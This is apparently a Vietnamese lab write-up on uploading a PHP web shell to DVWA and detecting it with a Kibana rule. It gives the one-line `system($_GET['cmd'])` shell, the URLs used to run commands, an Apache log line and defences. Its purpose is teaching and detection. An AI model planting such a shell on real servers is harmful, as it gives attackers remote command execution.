\# 🔥 Attack 04 – Web Shell (DVWA)



\## 📌 Mô tả



Trong kịch bản này, attacker khai thác chức năng upload file của DVWA để tải lên một web shell (`.php`) và thực thi lệnh từ xa trên server thông qua HTTP request.



\---



\## 🎯 Mục tiêu



\* Upload thành công web shell lên server

\* Thực thi command từ xa qua URL

\* Ghi nhận log trên hệ thống (Apache access log)

\* Phát hiện hành vi bằng Detection Rule trong Kibana



\---



\## 🖥️ Môi trường



\* \*\*Attacker:\*\* Kali Linux (10.10.1.130)

\* \*\*Victim:\*\* Ubuntu + DVWA (10.10.1.129)

\* \*\*Monitoring:\*\* Elastic Stack (Filebeat + Kibana)



\---



\## 🚨 Detection Rule



\### Rule Type



\* Custom Query



\### Index pattern



```

filebeat-\\\*

```



\### Query



```kql

event.dataset: "apache.access" AND message: (".php?cmd=" OR "cmd=")

```



!\\\[RULE](./screenshots/11-rule\_web\_shell.png)



\---



\## 🧠 Giải thích Detection



\* `.php?cmd=` → dấu hiệu web shell execution

\* `cmd=` → tham số thường dùng để truyền command

\* HTTP GET request → thực thi trực tiếp trên web server



\---



\## ⚙️ Bước thực hiện



\### 1. Truy cập chức năng upload của DVWA



```

http://10.10.1.129/DVWA/vulnerabilities/upload/

```



!\\\[DVWA](./screenshots/01-dvwa.png)



\---



\### 2. Tạo web shell đơn giản



Tạo file `shell.php`:



```php

<?php system($\_GET\['cmd']); ?>

```



!\\\[WEBSHELL](./screenshots/02-web\_shell.png)



\---



\### 3. Upload web shell



\* Chọn file `shell.php`

\* Upload qua giao diện DVWA



!\\\[UPLOAD](./screenshots/03-upload.png)



\---



\### 4. Truy cập và thực thi lệnh



Ví dụ:



```

http://10.10.1.129/DVWA/hackable/uploads/shell.php?cmd=id

```



!\\\[SHELL1](./screenshots/04-shell1.png)



```

http://10.10.1.129/DVWA/hackable/uploads/shell.php?cmd=whoami

```



!\\\[SHELL2](./screenshots/05-shell2.png)



```

http://10.10.1.129/DVWA/hackable/uploads/shell.php?cmd=ls

```



!\\\[SHELL3](./screenshots/06-shell3.png)



\---



\## 📄 Log thu được trên Victim



```text

10.10.1.130 - - \[29/Apr/2026:10:59:49 +0700] "GET /DVWA/hackable/uploads/shell.php?cmd=id HTTP/1.1" 200 258 "-" "Mozilla/5.0 ..."

```



!\\\[LOG](./screenshots/07-log\_victim.png)



\---



\## 📊 Log trên Kibana



\* Index: `filebeat-\*`

\* Dataset: `apache.access`



Trường quan trọng:



\* `event.dataset: apache.access`

\* `message` chứa request HTTP

\* URL có chứa `cmd=`



!\\\[LOGS](./screenshots/08-log\_kibana.png)



\---



\## 🎯 Kết quả



\* ✔ Upload thành công web shell

\* ✔ Thực thi lệnh từ xa (RCE)

\* ✔ Log được ghi nhận trên Apache

\* ✔ Kibana phát hiện và sinh alert



!\\\[ALERT](./screenshots/09-alert.png)

!\\\[ALERT1](./screenshots/10-alert\_detail.png)



\---



\## ⚠️ Nhận xét



\* Đây là một dạng \*\*Remote Command Execution (RCE)\*\* thông qua web shell

\* Nếu không có kiểm soát upload file:



&#x20; \* attacker có thể chiếm quyền server

\* Detection phụ thuộc vào:



&#x20; \* log web server

&#x20; \* khả năng parse log của hệ thống SIEM



\---



\## 🛡️ Biện pháp phòng chống



\* Kiểm tra loại file upload (whitelist)

\* Disable thực thi `.php` trong thư mục upload

\* Sử dụng WAF để chặn request chứa `cmd=`

\* Giám sát log truy cập bất thường



\---



\## 📌 MITRE ATT\&CK Mapping



\* \*\*Tactic:\*\* Execution

\* \*\*Technique:\*\* T1059 – Command and Scripting Interpreter

\* \*\*Technique:\*\* T1505 – Server Software Component



\---



\## ✅ Kết luận



Attack Web Shell cho phép attacker thực thi lệnh từ xa thông qua HTTP request.

Việc phát hiện dựa trên pattern trong URL (như `cmd=`) là hiệu quả trong môi trường lab, nhưng trong thực tế cần kết hợp nhiều kỹ thuật detection nâng cao hơn.



